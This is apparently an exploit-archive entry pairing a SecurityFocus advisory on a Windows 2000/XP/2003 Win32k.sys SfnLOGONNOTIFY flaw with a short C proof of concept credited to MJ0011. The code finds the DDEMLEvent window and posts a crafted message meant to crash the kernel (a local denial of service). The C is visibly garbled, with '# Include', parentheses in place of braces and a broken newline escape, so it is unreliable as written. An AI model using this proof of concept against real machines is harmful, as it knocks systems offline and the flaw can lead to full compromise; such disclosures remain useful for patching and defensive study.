# source: http://www.securityfocus.com/bid/39630/info

Microsoft Windows is prone to a local privilege-escalation vulnerability.

A local attacker may exploit this issue to execute arbitrary code with kernel-level privileges. Successful exploits will result in the complete compromise of affected computers. Failed exploit attempts may cause a denial-of-service condition.

Microsoft Windows 2000, Windows XP and Windows 2003 are affected by this issue. 

# Include "stdafx.h"
# Include "windows.h"
int main (int argc, char * argv [])
(
printf("Microsoft Windows Win32k.sys SfnLOGONNOTIFY Local D.O.S Vuln\nBy MJ0011\nth_decoder@126.com\nPressEnter");
 
getchar();
 
HWND hwnd = FindWindow ("DDEMLEvent", NULL);
 
if (hwnd == 0)
(
   printf ("cannot find DDEMLEvent Window! \ n");
   return 0;
)
 
PostMessage (hwnd, 0x4c, 0x4, 0x80000000);
 
 
return 0;
) 